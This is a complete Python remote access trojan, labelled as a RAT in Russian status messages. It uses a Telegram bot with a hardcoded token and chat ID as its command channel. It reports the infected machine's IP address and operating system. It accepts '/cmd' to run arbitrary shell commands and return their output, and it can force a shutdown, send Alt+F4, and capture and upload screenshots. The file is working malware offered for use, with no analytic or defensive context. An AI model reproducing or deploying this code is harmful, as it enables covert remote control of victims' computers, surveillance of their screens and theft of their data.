import os
import time
import requests
import subprocess
import platform

TELEGRAM_TOKEN = "8903499518:AAHzSL9SGMpwgZy0k-4BB1XXHm3clbkHgks"
CHAT_ID = "7352598189"

def send_tg(msg):
    try:
        requests.post(
            f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
            json={"chat_id": CHAT_ID, "text": msg}
        )
    except:
        pass

def main():
    ip = requests.get("https://api.ipify.org").text
    send_tg(f"🖥️ RAT запущен!\nIP: {ip}\nСистема: {platform.system()} {platform.release()}")

    while True:
        try:
            url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/getUpdates"
            updates = requests.get(url).json()
            if updates['result']:
                last = updates['result'][-1]
                msg = last['message']['text']
                chat = last['message']['chat']['id']
                if str(chat) == CHAT_ID:
                    if msg.startswith('/cmd'):
                        cmd = msg[5:]
                        out = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                        send_tg(f"💻 Результат:\n{out.stdout + out.stderr[:4000]}")
                    elif msg == '/shutdown':
                        subprocess.run("shutdown /s /t 5", shell=True)
                        send_tg("💻 ПК выключается через 5 секунд!")
                    elif msg == '/altf4':
                        import pyautogui
                        pyautogui.hotkey('alt', 'f4')
                        send_tg("⌨️ Alt+F4 отправлен!")
                    elif msg == '/screen':
                        import pyautogui
                        img = pyautogui.screenshot()
                        img.save("screen.png")
                        with open("screen.png", "rb") as f:
                            requests.post(
                                f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendPhoto",
                                data={"chat_id": CHAT_ID},
                                files={"photo": f}
                            )
                        os.remove("screen.png")
            time.sleep(5)
        except:
            time.sleep(5)

if __name__ == "__main__":
    main()
